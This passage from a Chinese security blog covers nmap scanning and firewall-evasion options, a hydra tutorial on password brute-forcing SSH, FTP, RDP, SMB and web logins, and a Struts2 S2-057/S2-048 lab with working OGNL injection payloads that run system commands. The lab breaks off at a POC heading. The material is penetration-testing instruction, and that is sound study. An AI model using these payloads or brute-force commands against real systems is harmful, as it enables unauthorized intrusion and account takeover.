<h3 id="3-6-ICMP-Ping-Types-扫描"><a href="#3-6-ICMP-Ping-Types-扫描" class="headerlink" title="3.6 ICMP Ping Types 扫描"></a>3.6 ICMP Ping Types 扫描</h3><p>ICMP是控制报文协议。nmap发送一个ICMP type8（回声请求）报文到目标ip地址，从运行的主机得到一个type0（回声相应）报文。</p>
<p>-PE选项简单的来说是通过向目标发送ICMP Echo数据包来探测目标主机是否在线，使用-PE选项打开该回声请求功能。</p>
<p>-PP选项是ICMP时间戳ping扫描，-PM选项可以进行icmp地址掩码ping扫描</p>
<p>nmap-PE-v192.168.0.12nmap-PP-v192.168.0.12nmap-PM-v192.168.0.12</p>
<h3 id="3-7-ARP-Ping扫描"><a href="#3-7-ARP-Ping扫描" class="headerlink" title="3.7 ARP Ping扫描"></a>3.7 ARP Ping扫描</h3><p>-PR 通常在扫描局域网时使用，在内网的情况下，使用ARP ping扫描方式是最有效的，在本地局域网中防火墙不会禁止ARP请求，这就使得它比其他ping扫描都更加高效。</p>
<p>nmap -PR 192.168.0.12</p>
<h3 id="3-8-扫描列表"><a href="#3-8-扫描列表" class="headerlink" title="3.8 扫描列表"></a>3.8 扫描列表</h3><p>列表扫描时主机发现的退化形式，它仅仅列出指定网络上的每台主机，不发送任何报文到目标主机。</p>
<p>默认情况下，Nmap仍然对主机进行反向域名解析以获取它们的名字。</p>
<p>nmap -sL 192.168.0.0/24</p>
<h3 id="3-9-禁止反向域名解析"><a href="#3-9-禁止反向域名解析" class="headerlink" title="3.9 禁止反向域名解析"></a>3.9 禁止反向域名解析</h3><p>如果单纯扫描一段IP，使用该选项可以大幅度减少目标主机的相应时间，从而更快的得到结果。</p>
<p>namp  -n -sL  192.168.0.0/24</p>
<h3 id="3-10反向域名解析"><a href="#3-10反向域名解析" class="headerlink" title="3.10反向域名解析"></a>3.10反向域名解析</h3><p>nmap -R -sL *. 192.168.0.0/24</p>
<h3 id="3-11-扫描TPv6地址"><a href="#3-11-扫描TPv6地址" class="headerlink" title="3.11 扫描TPv6地址"></a>3.11 扫描TPv6地址</h3><p>nmap -6 fe80::20c:29ff:fee0:2e76</p>
<h4 id="3-12-路由跟踪"><a href="#3-12-路由跟踪" class="headerlink" title="3.12 路由跟踪"></a>3.12 路由跟踪</h4><p>通过此选项可以轻松地查找出本地计算机到目标之间所经过的网络节点，并可以看到通过各个节点的时间。</p>
<p>nmap  –traceroute  -v  <a href="http://www.baidu.com/">www.baidu.com</a></p>
<h3 id="3-13-SCTP-INIT-Ping扫描"><a href="#3-13-SCTP-INIT-Ping扫描" class="headerlink" title="3.13 SCTP INIT Ping扫描"></a>3.13 SCTP INIT Ping扫描</h3><p>SCTP（流控制传输协议）是IETF在2000年定义的一个传输层协议。</p>
<p>SCTP可以看作是TCP协议的改进，它改进了TCP的一些不足，SCTP INIT Ping扫描通过向目标发送INIT包，根据目标主机的相应判断目标主机是否存活。</p>
<p>nmap  -PY  -v  192.168.0.12</p>
<h2 id="0x04-端口扫描"><a href="#0x04-端口扫描" class="headerlink" title="0x04 端口扫描"></a>0x04 端口扫描</h2><p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/7.jpg"></p>
<h3 id="4-1-从nmap识别端口状态"><a href="#4-1-从nmap识别端口状态" class="headerlink" title="4.1 从nmap识别端口状态"></a>4.1 从nmap识别端口状态</h3><p>Open：对外开放Closed：端口关闭状态Filtered：防火墙过滤或者网络堵塞Unfiltered：未被过滤，端口可访问，但是无法判断是开放还是关闭状态Open|Filtered：开放还是被过滤Closed|Filtered：不能确定是关闭还是被过滤，只可能出现在IPID Idle扫描中。</p>
<h3 id="4-2-时序选项"><a href="#4-2-时序选项" class="headerlink" title="4.2 时序选项"></a>4.2 时序选项</h3><p>在nmap中使用-T（0-5）可以启用时序选项，对于时序选项这里有0~5不同选项。</p>
<p>-T0（偏执的）：非常慢的扫描，用于IDS逃避。-T1（鬼祟的）：缓慢的扫描，用于IDS逃避。-T2（文雅的）：降低速度以降低对带宽的消耗，此选项不常用。-T3（普通的）：默认，根据目标的反应自动调整时间。-T4（野蛮的）：快速扫描，常用扫描方式，需要在很好的网络环境下进行扫描，请求可能会淹没目标。-T5（疯狂的）：极速扫描，这种扫描方式以牺牲准确度来提示扫描速度。</p>
<h3 id="4-3-TCP-SYN-扫描"><a href="#4-3-TCP-SYN-扫描" class="headerlink" title="4.3 TCP SYN 扫描"></a>4.3 TCP SYN 扫描</h3><p>半开放扫描，扫描速度快，扫描方式隐蔽。（在SYN扫描不能用时，TCP连接扫描会使用默认的TCP扫描）</p>
<p>nmap -sS 192.168.0.12</p>
<h3 id="4-4-TCP-连接扫描"><a href="#4-4-TCP-连接扫描" class="headerlink" title="4.4 TCP 连接扫描"></a>4.4 TCP 连接扫描</h3><p>端口扫描中最基础，最稳定的扫描方式</p>
<p>nmap  -sT  192.168.0.12</p>
<h3 id="4-5-UDP扫描"><a href="#4-5-UDP扫描" class="headerlink" title="4.5 UDP扫描"></a>4.5 UDP扫描</h3><p>UDP扫描非常缓慢，UDP端口扫描通过发送UDP数据包到目标主机并等待响应，它将判断目标端口是否开放状态，如果目标返回ICMP不可达的错误，说明端口是关闭的，如果得到正确的适当的响应，这说明端口是开放的。</p>
<p>nmap  -sU -p 80-500 192.168.0.12</p>
<h3 id="4-6-隐蔽扫描"><a href="#4-6-隐蔽扫描" class="headerlink" title="4.6 隐蔽扫描"></a>4.6 隐蔽扫描</h3><p>-sN是Null扫描，是通过发送非常规的TCP通信数据包对计算机进行探测，很多情况下Null扫描与Xmas扫描恰好相反，因为Null扫描不会标记任何数据包，若目标主机的相应端口是关闭的，会响应一个RST数据包，若目标端口是开放的则不会响应任何信息。</p>
<p>nmap -sN 192.168.0.12</p>
<p>-sF是FIN扫描，当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现，会阻止SYN数据包，这时我们使用TCP FIN扫描方式会有很好的穿透效果，因为TCP FIN扫描并不需要完成TCP握手。TCP FIN扫描就是向目标端口发送一个FIN包，如果收到目标响应的RST包，则说明目标端口是开放的，如果没有收到RST包则说明目标端口是关闭的。</p>
<p>nmap -sF 192.168.0.12</p>
<p>-sX是Xmas扫描，数据包的FIN、PSH和URG标记位置打开，既标志位1，根据RFC 793规定如果目标主机端口是开放的则会响应一个RST标志包。</p>
<p>nmap -sX 192.168.0.12</p>
<h3 id="4-7-TCP-ACK-扫描"><a href="#4-7-TCP-ACK-扫描" class="headerlink" title="4.7 TCP ACK 扫描"></a>4.7 TCP ACK 扫描</h3><p>使用该扫描不能确定端口是否是开放还是被过滤的。</p>
<p>nmap -sA -v 192.168.0.12</p>
<h3 id="4-8-TCP-窗口扫描"><a href="#4-8-TCP-窗口扫描" class="headerlink" title="4.8 TCP 窗口扫描"></a>4.8 TCP 窗口扫描</h3><p>当收到RST包时，根据TCP窗口的值是正数还是0来判断目标端口是开放还是关闭的。</p>
<p>从输出结果来看是不准确的，如果扫描的端口都是开放状态或者只有少数几个是关闭状态就很不准确。</p>
<p>nmap  -sW  -v  -F  192.168.0.12</p>
<h3 id="4-9-TCP-Maimon扫描"><a href="#4-9-TCP-Maimon扫描" class="headerlink" title="4.9 TCP Maimon扫描"></a>4.9 TCP Maimon扫描</h3><p>探测报文是FIN/ACK 根据 RFC 793(TCP)，无论端口开放或者关闭，都应该对这样的探测响应RST报文，如果端口开放，许多基于BSD的系统只是丢弃该探测报文。</p>
<p>nmap  -sM  -T4  192.168.0.12</p>
<h3 id="4-10-自定义TCP扫描"><a href="#4-10-自定义TCP扫描" class="headerlink" title="4.10 自定义TCP扫描"></a>4.10 自定义TCP扫描</h3><p>可以通过指定任意的TCP标志位来进行扫描。</p>
<p>nmap -sT –scanflags SYNURG 192.168.0.12</p>
<h3 id="4-11-空闲扫描"><a href="#4-11-空闲扫描" class="headerlink" title="4.11 空闲扫描"></a>4.11 空闲扫描</h3><p>空闲扫描允许端口完全欺骗扫描。可以使攻击者能够不使用自己的IP向目标主机发送数据包，它可以利用不活跃的僵尸主机反弹给攻击者一个旁通信道，从而进行端口扫描。IDS会把不活跃的僵尸主机当做攻击者，这是一种非常隐蔽的扫描方法。</p>
<p>nmap -sI  <a href="http://www.0day.co/">www.0day.co:80</a>  192.168.0.12</p>
<p>这是利用僵尸主机为<a href="http://www.0day.co的主机对192.168.0.12进行空闲扫描,如果有ids,ids则会把www.0day.co当做扫描者.选择的端口必须不能被自己的nmap主机或目标主机过滤掉并且必须为开放的./">www.0day.co的主机对192.168.0.12进行空闲扫描，如果有IDS，IDS则会把www.0day.co当做扫描者。选择的端口必须不能被自己的nmap主机或目标主机过滤掉并且必须为开放的。</a></p>
<h3 id="4-12-IP协议扫描"><a href="#4-12-IP协议扫描" class="headerlink" title="4.12 IP协议扫描"></a>4.12 IP协议扫描</h3><p>扫描IP协议号。IP协议扫描可以帮助用户确定目标主机哪些是支持IP协议的，例如TCP,ICMP.IGMP。虽然它遍历的是IP协议号并不是TCP或UDP端口，但仍可以使用-p选项选择需要扫描的协议号。它不是在UDP报文的端口域上循环，而时在IP协议域的2位上循环，发送空的IP报文头。</p>
<p>nmap -sO -T4 192.168.0.12</p>
<h3 id="4-13-FTP-Bounce扫描"><a href="#4-13-FTP-Bounce扫描" class="headerlink" title="4.13 FTP Bounce扫描"></a>4.13 FTP Bounce扫描</h3><p>使用-b选项就可以进行FTP Bounce Scan扫描。它允许用户连接到一台FTP服务器，然后要求文件送到一台第三方服务器，这种扫描方式被支持较少，但可绕过防火墙。</p>
<p>nmap  -b  192.168.0.12</p>
<h2 id="0x05-指纹识别与探测"><a href="#0x05-指纹识别与探测" class="headerlink" title="0x05 指纹识别与探测"></a>0x05 指纹识别与探测</h2><p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/8.jpg"></p>
<h3 id="5-1-设置扫描强度"><a href="#5-1-设置扫描强度" class="headerlink" title="5.1 设置扫描强度"></a>5.1 设置扫描强度</h3><p>使用Nmap进行扫描的时候，Nmap发送一系列探测报文，–version-intensity选项可以为每个报文赋予1~9之间的值。</p>
<p>被赋予较低值的探测报文对大范围的常见服务有效，而被赋予较高值的报文一般没有实际作用，强度水平说明了应该使用哪些探测报文。</p>
<p>当我们赋予的值越高，服务越有可能被正确识别，但是这也会牺牲相当长的一段实际，强度必须在0~9，默认的强度是7。</p>
<p>nmap -sV –version-intensity  1  192.168.0.12</p>
<h3 id="5-2-RPC扫描"><a href="#5-2-RPC扫描" class="headerlink" title="5.2 RPC扫描"></a>5.2 RPC扫描</h3><p>该选项对用于与其他端口扫描选项相结合使用，它对所有被发现开放的TCP/UDP端口执行SunRPC程序NULL命令，来试图确定它们是否为RPC端口，如果是RPC端口，则返回程序和版本号。</p>
<p>nmap  -sS  -sR  192.168.0.12</p>
<p>5.3 对指定的目标进行操作系统检测</p>
<p>使用–osscan-limit选项可以对指定的目标进行操作系统检测。</p>
<p>Nmap只对满足“具有打开和关闭的端口”条件的主机进行操作系统检测，这样可以节约时间，特别是在使用-P0扫描多个主机时。</p>
<p>这个选项仅在使用-O或-A进行操作系统检测时起作用。</p>
<p>nmap -O –osscan-limit  192.168.0.0/24</p>
<h2 id="0x06-躲避防火墙"><a href="#0x06-躲避防火墙" class="headerlink" title="0x06 躲避防火墙"></a>0x06 躲避防火墙</h2><p>nmap-f -v192.168.1.131#报文分段，将TCP头分段在几个包中，IDS及其他工具监测更加困难nmap –mtu16192.168.1.131#指定偏移大小，设置TCP/IP协议传输数据报时的最大传输单元，需要注意的是偏移量必须是8的倍数nmap -D192.168.1.20,192.168.1.21,192.168.1.22,ME192.168.1.131#IP欺骗，在进行版本检测或者TCP扫描的时候诱饵是无效的-D，指定诱饵ip，多个ip用逗号隔开ME，指定真实IPnmap -sI <a href="http://www.baidu.com:80192.168.1.131#源地址欺骗nmap">www.baidu.com:80192.168.1.131#源地址欺骗nmap</a> –source-port88192.168.1.131#源端口欺骗，指定一个比较安全的端口，nmap就可以从这些端口中发送数据nmap –data-length30192.168.1.131#指定发包长度，通常TCP包是40字节，ICMP Echo是28字节nmap -sT -PN –spoof-mac0192.168.1.131#MAC地址欺骗0，随机MAC地址MAC Address，手动指定MAC地址Vendor Name，指定厂商生成MAC地址</p>
<h2 id="0x07-保存与输出"><a href="#0x07-保存与输出" class="headerlink" title="0x07 保存与输出"></a>0x07 保存与输出</h2><p>#标准保存nmap-F-oNtest1.txt192.168.0.12#XML保存nmap-F-oXtest1.xml192.168.0.12#133t保存namp-F-oStest2.txt192.168.0.12#Grep保存nmap-F-oGtest3.txt192.168.0.12#保存到所有格式nmap-F-oAtestA192.168.0.12#补充保存文件nmap-F–append-output-oNtest1.txt192.168.0.12</p>
<h2 id="0x08-Nmap高级用法"><a href="#0x08-Nmap高级用法" class="headerlink" title="0x08 Nmap高级用法"></a>0x08 Nmap高级用法</h2><h2 id="0x09-使用Nmap进行渗透测试"><a href="#0x09-使用Nmap进行渗透测试" class="headerlink" title="0x09 使用Nmap进行渗透测试"></a>0x09 使用Nmap进行渗透测试</h2><p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/9.jpg"></p>
<h1 id="DirBuster使用"><a href="#DirBuster使用" class="headerlink" title="DirBuster使用"></a>DirBuster使用</h1><h2 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a><strong>工具说明</strong></h2><p><strong>目录扫描工具</strong>DirBuster支持全部的Web目录扫描方式。它既支持网页爬虫方式扫描，也支持基于字典暴力扫描，还支持纯暴力扫描。该工具使用Java语言编写，提供命令行（Headless）和图形界面（GUI）两种模式。其中，图形界面模式功能更为强大。用户不仅可以指定纯暴力扫描的字符规则，还可以设置以URL模糊方式构建网页路径。同时，用户还对网页解析方式进行各种定制，提高网址解析效率。</p>
<p>下载链接</p>
<p><strong><a href="https://sourceforge.net/projects/dirbuster/files/latest/download">https://sourceforge.net/projects/dirbuster/files/latest/download</a></strong></p>
<h2 id="工具用法"><a href="#工具用法" class="headerlink" title="工具用法"></a><strong>工具用法</strong></h2><p>1 .打开终端输入</p>
<p>dirbuster</p>
<p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/10.jpg"></p>
<p>2 .  填写扫描信息</p>
<p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/11.jpg"></p>
<p><strong>设置fuzz的时候，因为{dir}是个变量，可以自由变换。</strong></p>
<p><strong>/{dir}<a href="http://xxx.com/%7Bdir%7D">http://xxx.com/{dir}</a>   这个{dir} 对应的就是字典的每一行进行爆破</strong></p>
<p><strong>可以加目录</strong></p>
<p><strong>/admin/{dir}.php    这样就是爆破admin目录下所有php文件</strong></p>
<p>3 . 查看扫描信息</p>
<p><img src="/image/%E6%89%AB%E6%8F%8F%E5%99%A8/12.jpg"></p>
<p><strong>字典分享</strong></p>
<p><a href="https://links.jianshu.com/go?to=https://github.com/rootphantomer/Blasting_dictionary">https://github.com/rootphantomer/Blasting_dictionary</a></p>
<p>信息收集</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra</title>
    <url>/2019/05/28/hydra/</url>
    <content><![CDATA[<p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。官网：<a href="http://www.thc.org/thc-hydra%EF%BC%8C%E5%8F%AF%E6%94%AF%E6%8C%81AFP">http://www.thc.org/thc-hydra，可支持AFP</a>, Cisco</p>
<p>AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET,</p>
<p>HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET,</p>
<p>HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP,</p>
<p>MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere,</p>
<p>PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP</p>
<p>Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet,</p>
<p>VMware-Auth, VNC and XMPP等类型密码。</p>
<p>这款暴力密码破解工具相当强大，支持几乎所有协议的在线密码破解，其密码能否被破解关键在于字典是否足够强大。对于社会工程型渗透来说，有时能够得到事半功倍的效果。本文仅从安全角度去探讨测试，请勿用于非法事件。</p>
<p><strong>安装：</strong></p>
<p>1.yum</p>
<p>安装相应依赖包</p>
<p># yum install openssl-devel pcre-devel</p>
<p>ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel</p>
<p>2.hydra编译安装</p>
<p># cd /usr/local/src</p>
<p># wget <a href="http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz">http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz</a></p>
<p># tar zxf hydra-6.3-src.tar.gz</p>
<p># cd hydra-6.3-src</p>
<p># ./configure</p>
<p># make</p>
<p># make install</p>
<p># ./configure会检测当前系统一些组件配置，主要是对于破解支持模块的检测，可根据需要安装对应的支持库和依赖包</p>
<p># make</p>
<p># make</p>
<p>install</p>
<p><strong>参数：</strong></p>
<p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns]</p>
<p>[-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</p>
<p>-R 继续从上一次进度接着破解。</p>
<p>-S 采用SSL链接。</p>
<p>-s PORT 可通过这个参数指定非默认端口。</p>
<p>-l LOGIN 指定破解的用户，对特定用户破解。</p>
<p>-L FILE 指定用户名字典。</p>
<p>-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</p>
<p>-P FILE 大写，指定密码字典。</p>
<p>-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</p>
<p>-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</p>
<p>-M FILE 指定目标列表文件一行一条。</p>
<p>-o FILE 指定结果输出文件。</p>
<p>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</p>
<p>-t TASKS 同时运行的线程数，默认为16。</p>
<p>-w TIME 设置最大超时的时间，单位秒，默认是30s。</p>
<p>-v / -V 显示详细过程。</p>
<p>server 目标ip</p>
<p>service 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http-{head|get} http-{get|post}-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh smtp-auth[-ntlm] pcanywhere teamspeak sip vmauthd firebird ncp afp等等。</p>
<p>OPT 可选项</p>
<p><strong>使用：</strong></p>
<p>1.</p>
<p>手动创建用户名字典和密码字典，这里只是为了演示，只加了几个用户名和弱口令。真正破解时，需要利用密码字典生成器生成强大的字典</p>
<p>2.破解ssh：</p>
<p># hydra -L users.txt -P password.txt -t 1 -vV -e</p>
<p>ns 192.168.0.106 ssh</p>
<p>破解成功，直接显示结果。也可以使用 -o 选项指定结果输出文件。</p>
<p># hydra -L users.txt -P password.txt -t 1 -vV -e</p>
<p>ns -o save.log 192.168.1.104 ssh</p>
<p>其它实例：</p>
<p>1.破解ssh：</p>
<p># hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns ip ssh</p>
<p># hydra -l 用户名 -p 密码字典 -t 线程-o save.log -vV ip ssh</p>
<p>2.</p>
<p>破解ftp：</p>
<p># hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</p>
<p># hydra ip ftp -l 用户名 -P 密码字典-e ns -vV</p>
<p>3.get</p>
<p>方式提交，破解web登录：</p>
<p># hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns ip http-get /admin/</p>
<p># hydra -l 用户名 -p 密码字典 -t 线程-vV -e ns -f ip http-get /admin/index.php</p>
<p>4.post</p>
<p>方式提交，破解web登录：</p>
<p># hydra -l 用户名 -P 密码字典-s 80 ip http-post-form “/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password”</p>
<p># hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:wrong username or password”</p>
<p>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）</p>
<p>5.</p>
<p>破解https：</p>
<p># hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</p>
<p>6.</p>
<p>破解teamspeak：</p>
<p># hydra -l 用户名 -P 密码字典 -s 端口号-vV ip teamspeak</p>
<p>7.</p>
<p>破解cisco：</p>
<p># hydra -P pass.txt 10.36.16.18 cisco</p>
<p># hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</p>
<p>8.</p>
<p>破解smb：</p>
<p># hydra -l administrator -P top100.txt 192.168.0.102 smb</p>
<p>9.</p>
<p>破解pop3：</p>
<p># hydra -l muts -P pass.txt my.pop3.mail pop3</p>
<p>10.</p>
<p>破解rdp：</p>
<p># hydra 192.168.0.102 rdp -l administrator -P top100.txt -V</p>
<p>11.</p>
<p>破解http-proxy：</p>
<p># hydra -l admin -P pass.txt http-proxy://10.36.16.18</p>
<p>12.</p>
<p>破解imap：</p>
<p># hydra -L user.txt -p secret 10.36.16.18 imap PLAIN</p>
<p># hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</p>
<p>此工具强大之处远多于以上测试，其密码能否破解关键在于强大的字典，对于社工型渗透来说，有时能够得到事半功倍的效果</p>
<p>kail密码字典</p>
<p>/usr/share/wfuzz/wordlist/others/names.txt</p>
<p>/usr/share/wfuzz/wordlist/others/common_pass.txt</p>
<p>在该界面指定用户名和密码列表文件，这里使用Kali系统中存在的用户名和密码列表文件，并选择Loop around users选项。其中，用户名和密码文件分别保存在/usr/share/wfuzz/wordlist/others/names.txt和/usr/share/wfuzz/wordlist/others/common_pass.txt中</p>
<p><strong>附录：</strong>附录1:hydra: error while loading shared libraries: libssh.so.4:cannot open shared object file: No such file or directory</p>
<p>如果是ubuntu系统的话，直接apt-get install cmake</p>
<p>libssl-dev就可以了。但我系统的centOS，没有找到libssl-dev这东西。因为手#动编译了libssh</p>
<p># yum install cmake</p>
<p># cd /usr/local/src</p>
<p># wget <a href="http://www.libssh.org/files/0.4/libssh-0.4.8.tar.gz">http://www.libssh.org/files/0.4/libssh-0.4.8.tar.gz</a></p>
<p># tar zxf libssh-0.4.8.tar.gz</p>
<p># cd libssh-0.4.8</p>
<p># mkdir build</p>
<p># cd build</p>
<p># cmake -DCMAKE_INSTALL_PREFIX=/usr -DCMAKE_BUILD_TYPE=Debug -DWITH_SSH1=ON ..</p>
<p># make</p>
<p># make install</p>
<p># /sbin/ldconfig  //要执行这句，不然会出现hydra: error while loading shared libraries: libssh.so.4: cannot open shared object file: No such file or directory</p>
<p># cd /usr/local/src</p>
<p># wget <a href="http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz">http://freeworld.thc.org/releases/hydra-6.3-src.tar.gz</a></p>
<p># tar zxf hydra-6.3-src.tar.gz</p>
<p># cd hydra-6.3-src</p>
<p># ./configure</p>
<p># make</p>
<p># make install</p>
<p>附录2：</p>
<p><a href="http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html">http://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html</a></p>
<p><a href="http://www.ha97.com/5186.html">http://www.ha97.com/5186.html</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>struts2实验</title>
    <url>/2020/07/12/struts2%E5%AE%9E%E9%AA%8C/</url>
    <content><![CDATA[<h1 id="Struts2-057实验"><a href="#Struts2-057实验" class="headerlink" title="Struts2 057实验"></a>Struts2 057实验</h1><p>参考：<a href="https://links.jianshu.com/go?to=https://blog.csdn.net/weixin_43625577/article/details/97111575">https://blog.csdn.net/weixin_43625577/article/details/97111575</a></p>
<p><a href="https://links.jianshu.com/go?to=https://www.sinesafe.com/article/20180823/struts2057.html">https://www.sinesafe.com/article/20180823/struts2057.html</a></p>
<p>受影响的版本是ApacheStruts 2.3–Apache Struts2.3.34、Apache Struts2.5–Apache Struts2.5.16等系列版本</p>
<blockquote>
<p>注意事项：</p>
<p>首先在struts.xml配置文件添加<constant name="struts.mapper.alwaysSelectFullNamespace" value="true" /></p>
<p>其次修改配置文件struts-actionchaining.xml 删掉namespace属性，或使用了通配符*</p>
<p>最后把type=”chain”改成type=”redirectAction”两个文件都要改</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击payload: http:&#x2F;&#x2F;192.168.0.127:8080&#x2F;struts2-showcase&#x2F;$&#123;(1+1)&#125;&#x2F;actionChain1.action</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&#39;calc.exe&#39;)&#125;</span><br><span class="line"></span><br><span class="line">$&#123;</span><br><span class="line"></span><br><span class="line">(#dm&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct&#x3D;#request[&#39;struts.valueStack&#39;].context).(#cr&#x3D;#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou&#x3D;#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a&#x3D;@java.lang.Runtime@getRuntime().exec(&#39;id&#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/strus/1.jpg"></p>
<h1 id="Struts2-048实验"><a href="#Struts2-048实验" class="headerlink" title="Struts2 048实验"></a>Struts2 048实验</h1><p>参考：</p>
<p><a href="https://links.jianshu.com/go?to=https://www.ichunqiu.com/course/58753">https://www.ichunqiu.com/course/58753</a></p>
<p>使用方法struts2_S2-048.py <code>&lt;url&gt;  &lt;cmd&gt;</code></p>
<p><img src="/image/strus/2.jpg"></p>
<h3 id="二、-影响版本："><a href="#二、-影响版本：" class="headerlink" title="二、 影响版本："></a>二、 影响版本：</h3><p>Struts 2.3.x with Struts 1 plugin and Struts 1 action</p>
<h3 id="三、-漏洞介绍："><a href="#三、-漏洞介绍：" class="headerlink" title="三、 漏洞介绍："></a>三、 漏洞介绍：</h3><p>Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限</p>
<p><strong>产生原因：</strong></p>
<p>这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。</p>
<p>而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。</p>
<h3 id="四、-环境搭建："><a href="#四、-环境搭建：" class="headerlink" title="四、 环境搭建："></a>四、 环境搭建：</h3><p>参考网址：</p>
<p><a href="https://links.jianshu.com/go?to=http://netsecurity.51cto.com/art/201707/544837.htm">http://netsecurity.51cto.com/art/201707/544837.htm</a></p>
<p>下载/struts/2.3.24</p>
<p>下载地址：<a href="https://links.jianshu.com/go?to=http://archive.apache.org/dist/struts/2.3.24/">http://archive.apache.org/dist/struts/2.3.24/</a></p>
<p>百度云链接：链接：<a href="https://links.jianshu.com/go?to=http://pan.baidu.com/s/1dFeUyNv">http://pan.baidu.com/s/1dFeUyNv</a>密码：279t</p>
<p>下载安装xampp</p>
<p>部署showcase</p>
<p><img src="/image/strus/3.jpg"></p>
<p>解压</p>
<p><img src="/image/strus/4.jpg"></p>
<p>复制到</p>
<p><img src="/image/strus/5.jpg"></p>
<p>重启tomcat</p>
<p><img src="/image/strus/6.jpg"></p>
<p>已成功自动部署</p>
<p><img src="/image/strus/7.jpg"></p>
<h3 id="五、-测试网址："><a href="#五、-测试网址：" class="headerlink" title="五、 测试网址："></a>五、 测试网址：</h3><p>访问<a href="https://links.jianshu.com/go?to=http://127.0.0.1:8080/struts2-showcase/index.action">http://127.0.0.1:8080/struts2-showcase/index.action</a></p>
<p><img src="/image/strus/8.jpg"></p>
<p>进入<a href="https://links.jianshu.com/go?to=http://127.0.0.1:8080/struts2-showcase/integration/editGangster.action">http://127.0.0.1:8080/struts2-showcase/integration/editGangster.action</a></p>
<p>以第一个参数为攻击点，在其执行OGNL语法，${10-7}，</p>
<p><img src="/image/strus/9.jpg"></p>
<p>成功执行</p>
<p><img src="/image/strus/10.jpg"></p>
<p>抓包</p>
<p>注意端口不要重复,即不要与以下重复</p>
<p><img src="/image/strus/11.jpg"></p>
<p>我这里用的是9090</p>
<p><img src="/image/strus/12.jpg"></p>
<p>抓包获取</p>
<p><img src="/image/strus/13.jpg"></p>
<p>修改Conten-Type:为（粗体部分为命令）</p>
<h3 id="六、-POC"><a href="#六、-POC" class="headerlink" title="六、 POC:"></a>六、 POC:</h3><blockquote>
